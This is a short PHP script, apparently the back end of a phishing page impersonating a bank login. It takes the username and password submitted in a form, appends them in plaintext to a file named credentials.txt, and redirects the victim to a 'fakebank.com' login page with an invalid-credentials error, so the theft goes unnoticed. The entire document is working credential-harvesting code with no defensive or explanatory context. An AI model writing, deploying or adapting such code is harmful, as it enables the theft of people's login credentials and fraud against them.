php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$log = "$username:$password\n";
file_put_contents('credentials.txt', $log, FILE_APPEND);

header("Location: https://www.fakebank.com/login?error=invalid_credentials");
?>
